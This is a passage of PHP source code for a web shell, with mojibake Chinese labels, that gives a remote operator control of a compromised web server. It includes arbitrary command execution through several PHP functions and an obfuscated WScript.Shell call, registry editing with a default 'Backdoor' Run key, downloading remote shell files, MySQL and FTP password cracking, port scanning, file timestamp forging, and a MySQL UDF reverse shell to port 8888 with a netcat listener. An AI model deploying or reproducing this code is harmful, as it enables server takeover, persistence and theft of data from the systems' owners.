        echo ($a=='0') ? "дעֵɹ!" : "д ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." ʧ!";
}

// ɾע
elseif(($regdelete) AND !empty($_POST['delregname'])) {
        $shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
        $a = @$shell->RegDelete($_POST['delregname']);
        echo ($a=='0') ? "ɾעֵɹ!" : "ɾ ".$_POST['delregname']." ʧ!";
}

elseif (strlen($notice) == 251){
        echo "$notice";
}
else{        
                setcookie ("adminpass", "");
                echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";}

echo "</b></p>\n";
/*===================== ִв  =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
        $tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>ļ</b></td>
        <td align="center" nowrap width="16%"><b></b></td>
    <td align="center" nowrap width="16%"><b>޸</b></td>
    <td align="center" nowrap width="11%"><b>С</b></td>
    <td align="center" nowrap width="6%"><b></b></td>
    <td align="center" nowrap width="24%"><b></b></td>
  </tr>
  <FORM action="" method="POST">
<?php
// Ŀ¼б
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
        $filepath="$dir/$file";
        $a=@is_dir($filepath);
        if($a=="1"){
                if($file!=".." && $file!=".")        {
                        $ctime=@date("Y-m-d H:i:s",@filectime($filepath));
                        $mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
                        $dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
                        if($dirperm=="0777") $dirperm = "<span class=\"redfont\">".$dirperm."</span>";
                        echo "<tr class=".getrowbg().">\n";
                        echo "  <td style=\"padding-left: 5px;\"><INPUT type=checkbox value=$file name=dl[]> [<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
                        echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
                        echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
                        echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=search&dir=".$filepath."\">Search</a></td>\n";
                        echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
                        echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','ȷҪɾ $file Ŀ¼? \\n\\nĿ¼ǿ,˴βɾĿ¼µļ!','1')\">ɾ</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\"></a> |</td>\n";
                        echo "</tr>\n";
                        $dir_i++;
                } else {
                        if($file=="..") {
                                echo "<tr class=".getrowbg().">\n";
                                echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">ϼĿ¼</a></td>\n";
                                echo "</tr>\n";
                        }
                }
        }
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<?
// ļб
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
        $filepath="$dir/$file";
        $a=@is_dir($filepath);
        if($a=="0"){                
                $size=@filesize($filepath);
                $size=$size/1024 ;
                $size= @number_format($size, 3);
                if (@filectime($filepath) == @filemtime($filepath)) {
                        $ctime=@date("Y-m-d H:i:s",@filectime($filepath));
                        $mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
                } else {
                        $ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
                        $mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
                }
                @$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
                if($fileperm=="0777") $fileperm = "<span class=\"redfont\">".$fileperm."</span>";
                echo "<tr class=".getrowbg().">\n";
                echo "  <td style=\"padding-left: 5px;\">";
                echo "<INPUT type=checkbox value=$file name=dl[]>";
                echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
                echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
                echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
                echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
                echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
                echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\"></a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','ȷҪɾ $file ļ?','2')\">ɾ</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\"></a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ</a></td>\n";
                echo "</tr>\n";
                $file_i++;
        }
}// while
@closedir($dirs); 
if(get_cfg_var('safemode'))$z = "<a href=\"#\" title=\"ʹ˵\" onclick=\"alert('PhpΪȫģʽٴűʱ\\n\\nдļļڱط,ֱء')\">(?)</a>";
else $z = "<a href=\"#\" title=\"ʹ˵\" onclick=\"alert('Phpзǰȫģʽĵȴ\\n\\nдļļڱطֱء\\n\\n߽ѹļunzipto:\\n\\nunzipto:temp\\n\\nѹtempļ')\">(?)</a>";
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' ļ'.$tb->makeinput('localfile','','','text','15').''.$tb->makeinput('downrar','ѡдػ򱾵ر','','submit').' &nbsp'.$z.'</td><td align="right">'.$dir_i.' Ŀ¼ / '.$file_i.' ļ</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
        if(empty($newfile)) {
                $filename="$dir/$editfile";
                $fp=@fopen($filename,"r");
                $contents=@fread($fp, filesize($filename));
                @fclose($fp);
                $contents=htmlspecialchars($contents);
        }else{
                $editfile=$newfile;
                $filename = "$dir/$editfile";
        }
        $action = "?dir=".urlencode($dir)."&editfile=".$editfile;
        $tb->tableheader();
        $tb->formheader($action,'½/༭ļ');
        $tb->tdbody('ǰļ: '.$tb->makeinput('editfilename',$filename).' ļļ Php: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'ֻܻѹphp롣\\n\\nphpphp֧gzinflate벻Ҫʹã\')"> ');
        $tb->tdbody($tb->maketextarea('filecontent',$contents));
        $tb->makehidden('do','doeditfile');
        $tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
        $nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
        $action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
        $tb->tableheader();
        $tb->formheader($action,'޸ļ');
        $tb->makehidden('oldname',$dir."/".$nowfile);
        $tb->makehidden('dir',$dir);
        $tb->tdbody('ǰļ: '.basename($nowfile));
        $tb->tdbody('Ϊ: '.$tb->makeinput('newname'));
        $tb->makehidden('do','rename');
        $tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "eval") {
        $action = "?dir=".urlencode($dir)."";
        $tb->tableheader();
        $tb->formheader(''.$action.' "target="_blank' ,'ִphpű');
        $tb->tdbody($tb->maketextarea('phpcode',$contents));
        $tb->formfooter('1','30');
        
}
elseif ($_GET['action'] == "fileperm") {
        $action = "?dir=".urlencode($dir)."&file=".$file;
        $tb->tableheader();
        $tb->formheader($action,'޸ļ');
        $tb->tdbody('޸ '.$file.' Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
        $tb->makehidden('file',$file);
        $tb->makehidden('dir',urlencode($dir));
        $tb->makehidden('do','editfileperm');
        $tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
        $action = "?dir=".urlencode($dir);
        $cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
        $tb->tableheader();
        $tb->formheader($action,'¡ļ޸ʱ');
        $tb->tdbody("޸ļ: ".$tb->makeinput('curfile',$file,'readonly')."  Ŀļ: ".$tb->makeinput('tarfile','·ļ'),'center','2','30');
        $tb->makehidden('do','domodtime');
        $tb->formfooter('','30');
        $tb->formheader($action,'Զļ޸ʱ');
        $tb->tdbody('<br><ul><li>ЧʱͷΧǴӸʱ 1901  12  13   20:45:54  2038 1  19  ڶ 03:14:07<br>(ڸ 32 λзСֵֵ)</li><li>˵: ȡ 01  30 ֮, ʱȡ 0  24 ֮, ֺȡ 0  60 ֮!</li></ul>','left');
        $tb->tdbody('ǰļ: '.$file);
        $tb->makehidden('curfile',$file);
        $tb->tdbody('޸Ϊ: '.$tb->makeinput('year','1984','','text','4').'  '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).'  '.$tb->makeinput('data','18','','text','2').'  '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').'  '.$tb->makeinput('second','00','','text','2').' ','center','2','30');
        $tb->makehidden('do','modmytime');
        $tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
        $action = "??action=shell&dir=".urlencode($dir);
        $tb->tableheader();
        $tb->tdheader('WebShell Mode');
  if (substr(PHP_OS, 0, 3) == 'WIN') {
                $program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
                $prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
                echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
                $tb->tdbody('޻г  ļ: '.$tb->makeinput('program',$program).' : '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
                $tb->makehidden('do','programrun');
                echo "</form>\n";
        }
echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
        $tb->tdbody('ʾ:ȫ,дļ.Եõȫ. ');
        $tb->tdbody('proc_open費Ĭϵwinntϵͳʹ,޸ļǵд˳,һδĽ.');
        $tb->tdbody('proc_openҪʹõcmdλ:'.$tb->makeinput('cmd',$cmd,'','text','30').'(ҪlinuxϵͳǴԼ޸İ)');
   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
   $tb->tdbody('ѡִк: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' : '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
        if (!empty($_POST['command'])) {
                if ($execfunc=="system") {
                        system($_POST['command']);
                } elseif ($execfunc=="passthru") {
                        passthru($_POST['command']);
                } elseif ($execfunc=="exec") {
                        $result = exec($_POST['command']);
                        echo $result;
                } elseif ($execfunc=="shell_exec") {
                        $result=shell_exec($_POST['command']);
                        echo $result;        
                } elseif ($execfunc=="popen") {
                        $pp = popen($_POST['command'], 'r');
                        $read = fread($pp, 2096);
                        echo $read;
                        pclose($pp);
                } elseif ($execfunc=="wscript") {
                        $wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
                        $exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
                        $stdout = $exec->StdOut();
                        $stroutput = $stdout->ReadAll();
                        echo $stroutput;
                } elseif($execfunc=="proc_open"){
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
if (is_resource($process)) {

    // д
    fwrite($pipes[0], "".$_POST['command']."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    // ȡ
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
      }
    fclose($pipes[2]);

    proc_close($process);
}
                } else {
                        system($_POST['command']);
                }
        }
        ?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
        $action = '?action=reg';
        $regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
        $registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
        $regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
        $delregname = $_POST['delregname'];
        $tb->tableheader();
        $tb->formheader($action,'ȡע');
        $tb->tdbody('ֵ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','ȡ','','submit'),'center','2','50');
        echo "</form>";

        $tb->formheader($action,'дע');
        $cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
        $tb->tdbody('ֵ: '.$tb->makeinput('writeregname',$registre,'','text','56').' : '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' ֵ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','д','','submit'),'center','2','50');
        echo "</form>";

        $tb->formheader($action,'ɾע');
        $tb->tdbody('ֵ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','ɾ','','submit'),'center','2','50');
        echo "</form>";
        $tb->tablefooter();
}//end reg
elseif ($_GET['action'] == "downloads"){
$action = '?action=dir';
        $tb->tableheader();
        $tb->formheader($action,'httpļģʽ');
        $tb->tdbody('ʹñܰһЩСhttpʽص˷','center');
        $tb->tdbody('ļλ: '.$tb->makeinput('durl','http://1v1.name/myshell.txt','','text','70').'<br>ص:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','','','submit'),'center','1','35');
        echo "</form>";
        $tb->tdbody('ע,ļ̫޷Ӱִٶ.','center');
        $tb->tablefooter();
}
elseif ($_GET['action'] == "mix"){
$action = '?action=dir';
        $tb->tableheader();
        $tb->formheader($action,'ѹmix.dllļ');
        $tb->tdbody('԰ѹphpspymix.dllѹ','center');
        $tb->tdbody('ѹΪ: '.$tb->makeinput('mixto','./mix.dll','','text','70').''.$tb->makehidden('action','mix').''.$tb->makeinput('','unzip','','submit'),'center','1','35');
        echo "</form>";
        $tb->tdbody('ʹԻ·.','center');
        $tb->tablefooter();
}
elseif ($_GET['action'] == "crack"){
$action = '?action=dir';
        $tb->tableheader();
        $tb->tdbody('ҪͻһЩرĵط׼','center');
        if($type=="crack"){
                if(!empty($_POST['thename'])) {
                        $thehost = gethostbyname($_POST['thename']);
                        if(!$thehost) $thehost = '';
        }
        $tb->formheader($action,'ƽmysqlftp');
        $tb->tdbody('һЩmysql½ƽ⡣','center');
        $tb->tdbody('host: '.$tb->makeinput('host','localhost','','text','12').'&nbspʺ:'.$tb->makeinput('user','root','','text','12').''.$tb->makehidden('do','crack').'&nbsp;ֵ:'.$tb->makeinput('passfile','./password.txt','','text','20').'&nbsp;һ̽:'.$tb->makeinput('onetime','100','','text','6').'&nbsp;'.$tb->makeinput('','crack','','submit'),'center','1','35');
        $tb->tdbody('MYSQL:<input type="radio" name="ctype" value="mysql" checked> &nbsp;&nbsp;Ftp:<input type="radio" name="ctype" value="ftp">','center');
        echo "</form>";
        if(getphpcfg("allow_url_fopen")=="Yes") $temp = "Զļ";
        $tb->tdbody('ֵʹԻ·'.$temp.'FtpƽѾͨ','center');
        $tb->formheader($action,'˿ɨ');
        $tb->tdbody('Խж˿ڵļɨ衣','center');
        $tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;˿ڱ:'.$tb->makeinput('port',''.$admin[port].'','','text','60').'','center','1','35');
        $tb->tdbody(''.$tb->makeinput('','ж˿ɨ','','submit').'','center');
        echo "</form>";
        $tb->tdbody('˿ڱҪĶ˿öŸ!','center');
        $tb->formheader('?action=crack&type=crack',' to IPת &Ч');
        $tb->tdbody('ȡһҵIPʱ','center');
        $tb->tdbody(': '.$tb->makeinput('thename',$thename,'','text','20').'&nbspIP:'.$tb->makeinput('thehost',$thehost,'','text','20').''.$tb->makeinput('','ת','','submit'),'center','1','35');
        echo "</form>";
}else{
        $tb->formheader("".$action."\" enctype=\"multipart/form-data",'ʹMysqlϴļ');
        $tb->tdbody('MysqlʺŰļmysqlȨ޵WebshellȨޱдĵط','center');
        $tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').'db: '.$tb->makeinput('database','mysql.user','','text','16').'upto: '.$tb->makeinput('uppath','c:/','','text','16').''.$tb->makehidden('action','mysqlup'),'center','1','35');
        $tb->tdbody('ϴļ: '.$tb->makeinput('upname','','','text','16').'ѡļ: '.$tb->makeinput('upfile','','','file','26').''.$tb->makeinput('','upload','','submit'),'center','1','35');
        echo "</form>";
        $tb->tdbody('òֻҪfileȨ޵ʺžͿ,дϴļΪԭļ.','center');
        $tb->formheader($action,'Mysqlļ');
        $tb->tdbody('MysqlʺWebshellܶȡصļݿļ ѹ <input type="checkbox" name="rardown" value="yes" onclick="javascript:alert(\'ʹô˹ܵʱRARѹѡļ!\')"> ','center');
        $tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').''.$tb->makehidden('action','mysqldown').'ļ: '.$tb->makeinput('filename','C:/windows/php.ini','','text','26').''.$tb->makeinput('','download','','submit'),'center','1','35');
        echo "</form>";
        $tb->tdbody('òֻҪfileȨ޵ʺžͿ,ٿԶھ.','center');
        $tb->tdbody('WindowsĬMysqlΪSystemȨޣLinuxϵͳȨ޲ߡ.','center');
}
        $tb->tablefooter();
}
elseif($_GET['action']=="setting"){
        if($admin[check]=="1") $check[1] = "checked";
        else $check[2] ="checked";
                if($admin[alexa]=="1") $check[3] = "checked";
        else $check[4] ="checked";
        $action = '?action=dir';
        $tb->tableheader();
        $tb->formheader($action ,'ò');
        $tb->tdbody('Ļò֡','center');
        //$tb->tdbody('վʾ: '.$tb->makeinput('alexa',$admin[alexa],'','text','20').'','center');
        $tb->tdbody('Ƿʾվ:&nbsp;&nbsp;Yes:<input type="radio" name="alexa" value="1" '.$check[3].'> &nbsp;&nbsp;No:<input type="radio" name="alexa" value="2" '.$check[4].'>','center');
        $tb->tdbody(': '.$tb->makeinput('pass',$admin[pass],'','text','12').'ƽʱ: '.$tb->makeinput('jumpsecond',$admin[jumpsecond],'','text','2').'','center');
        $tb->tdbody('Ĭ϶˿ڱ: '.$tb->makeinput('port',$admin[port],'','text','33').'','center');
        $tb->makehidden('do','setting');
        $tb->tdbody('Ƿʹ:&nbsp;&nbsp;&nbsp;&nbsp;ʹ:<input type="radio" name="check" value="1" '.$check[1].'> &nbsp;&nbsp;ʹ:<input type="radio" name="check" value="2" '.$check[2].'>','center');
        $tb->tdbody($tb->makeinput('','޸','','submit'),'center');
        echo "</form>";
        $tb->tdbody('޸ĻҪµ½ſԽwebshell','center');
        $tb->tableheader();
}
elseif ($_GET['action'] == "search"){
$action = '?dir='.$dir.'';
        $tb->tableheader();
        $tb->formheader($action,'ļ');
        $tb->tdbody('ʹñܲһĿ¼µļдļŹؼ!','center');
        $tb->tdbody('ļλ: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>:'.$tb->makeinput('oldkey','¼','','text','60').''.$tb->makehidden('do','search').'<br> Ƿ<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'ѡ˴гؼļĶ,ڵļжнбȶ\\n\\nʽΪ:[/ļ][12/99],з.\\n\\n˹ܻܿһֵʱ,뿼ʹ,ûпɶȨ޽!\')"> (˹ܺһܻӰִٶȣĬϹر!) <br>ʵȡ:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'ѡ˴гؼλü趨ڵĲַ..\\n\\nȡ˹ܲļƶҵļϼɶȡ....\\n\\n˹ܻܿһֵʱ,뿼ʹ,ûпɶȨ޽!\')"> ȡؼǰ'.$tb->makeinput('beline','0','','text','3').'ַ '.$tb->makehidden('dir',''.$dir.'').'ؼʺ'.$tb->makeinput('endline','10','','text','3').'ַ... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','ʼļ','','submit'),'center','1','35');
        echo "</form>";
        $tb->tdbody('̫Ŀ¼ˣҺò.ѡٶȻʾ[/ܹ]','center');
        $tb->tablefooter();
}
elseif ($_GET['action'] == "proxy") {
        $url="http://1v1.name";
        $action = '?action=proxy';
        $tb->tableheader();
        $tb->formheader($action,'ߴ','proxyframe');
        $tb->tdbody('<br><ul><li>ñܽʵּ򵥵 HTTP ,ʾʹ·ͼƬӼCSSʽ.</li><li>ñܿͨĿURL,֧ SQL Injection ̽ԼĳЩַ.</li><li>ñ URL,ĿµIP¼ : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
        $tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','','','submit'),'center','1','40');
        $tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="'.$url.'"></iframe>');
        if (strlen($url) != 15) {
                setcookie ("adminpass", "");
                echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";
        }
        echo "</form>";
        $tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
        $action = '?action=sql';

        $servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
        $dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
        $dbpassword = $_POST['dbpassword'];
        $dbname = $_POST['dbname'];
        $sql_query = $_POST['sql_query'];
if($type=="fun"){
$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*ִһ*/
/*ִ nc -vv -l -p 8888*/";
}
        $tb->tableheader();
        $tb->formheader($action,'ִ SQL ');
        $tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));
        $tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
        $tb->makehidden('do','query');
        $tb->formfooter('1','30');
}//end sql query
elseif ($_GET['action'] == "adodb") {
        $action = '?action=adodb';
        if($type=='mysql'){
                $sqltype = 'Driver={MySql};Server=127.0.0.1;Port=3306;Database=DbName;Uid=root;Pwd=****';
                $echotype = "[Mysql]";
        }
        elseif($type=='mssql') {
                $sqltype = 'Driver={Sql Server};Server=127.0.0.1,1433;Database=DbName;Uid=sa;Pwd=****';
                $echotype = "[Mssql]";
        }
        elseif($type=='access'){
                $sqltype = 'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\վ\DbName.mdb;Jet OLEDB:Database Password=***';
                $echotype = "[Access]";
        }elseif($type=='oracle'){
                $sqltype = 'Provider=MSDAORA.1;Password=;User ID=ʺ;Data Source=;Persist Security Info=True;';
                $echotype = "[Oracle]";
        }elseif($type=='db2'){
                $sqltype = 'Provider=DB2OLEDB;Network Transport Library=TCPIP;Network Address=127.0.0.1;Initial Catalog=MyCtlg;Package Collection=MyPkgCol;Default Schema=Schema;User ID=ʺ;Password=';
                $echotype = "[DB2]";
        }
        if($_POST['sqltype']) $sqltype = $_POST['sqltype'];;
        if(!isset($sqltype)) $sqltype = 'ѡݿͻԼadodb䡣';
        $dbpassword = $_POST['dbpassword'];
        $dbname = $_POST['dbname'];
        $sql_query = $_POST['sql_query'];
echo <<<EOM
<SCRIPT language=JavaScript>
function mycopy()
{
content=document.all.sqltype.value;
clipboardData.setData('text',content);
alert('Ѿ,ճط.')
}
</SCRIPT>
EOM;
        $tb->tableheader();
        $tb->formheader($action,'ʹ ADODB ִ SQL ');
        $tb->tdbody('(<a href="?action=adodb&type=mysql">Mysql</a>) (<a href="?action=adodb&type=mssql">Mssql</a>) (<a href="?action=adodb&type=access">Access</a>) (<a href="?action=adodb&type=oracle">Oracle</a>) (<a href="?action=adodb&type=db2">DB2</a>)');
                $tb->tdbody(' WindowsĬϿCOMִݿ⣬ĳЩ»õϣҪԴ');
        $tb->tdbody(''.$echotype.'  SQL Type: '.$tb->makeinput('sqltype',$sqltype,'','text','65').'&nbsp;<a href="#" onclick="mycopy()">Copy</a>');
        $tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
        $tb->makehidden('do','adodbquery');
        $tb->makehidden('type',$type);
        $tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
        $action = '?action=sqlbak';
        $servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
        $dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
        $dbpassword = $_POST['dbpassword'];
        $dbname = $_POST['dbname'];
        $tb->tableheader();
        $tb->formheader($action,' MySQL ݿ');
        $tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));
        @mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
                $cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
        if (empty($cachetables)) {
                $tb->tdbody('<b>ûݿ or ǰݿûκݱ</b>');
        } else {
                $tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">ѡ:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ·:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].$cckk.'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ֱص (ʺСݿ)</td></tr></table>');
                $tb->makehidden('do','backupmysql');
                $tb->formfooter('0','30');
        }
        $tb->tablefooter();
        @mysql_close();
}//end sql backup
elseif ($_GET['action'] == "phpenv") {
        $user = " <a href=\"?action=nowuser\" target=\"_blank\">ȡǰû</a> ";
        $upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ϴ";
        $adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
        if ($dis_func == "") {
                $dis_func = "No";
        }else {
                $dis_func = str_replace(" ","<br>",$dis_func);
                $dis_func = str_replace(",","<br>",$dis_func);
        }
        $phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
                $info = array(
                    0 => array("ǰphpû",$user),
                        1 => array("ϵͳ",PHP_OS),
                        2 => array("ʱ",date("Ymd h:i:s",time())),
                        3 => array("","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
                        4 => array("IPַ",gethostbyname($_SERVER['SERVER_NAME'])),
                        5 => array("ϵͳֱ",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
                        6 => array("",$_SERVER['SERVER_SOFTWARE']),
                        7 => array("Web˿",$_SERVER['SERVER_PORT']),
                        8 => array("PHPзʽ",strtoupper(php_sapi_name())),
                        9 => array("PHP汾",PHP_VERSION),
                        10 => array("ڰȫģʽ",getphpcfg("safemode")),
                        11 => array("Ա",$adminmail),
                        12 => array("ļ·",__FILE__),
            13 => array("ʹ URL ļ allow_url_fopen",getphpcfg("allow_url_fopen")),
                        14 => array("̬ӿ enable_dl",getphpcfg("enable_dl")),
                        15 => array("ʾϢ display_errors",getphpcfg("display_errors")),
                        16 => array("Զȫֱ register_globals",getphpcfg("register_globals")),
                        17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
                        18 => array("ʹڴ memory_limit",getphpcfg("memory_limit")),
                        19 => array("POSTֽ post_max_size",getphpcfg("post_max_size")),
                        20 => array("ϴļ upload_max_filesize",$upsize),
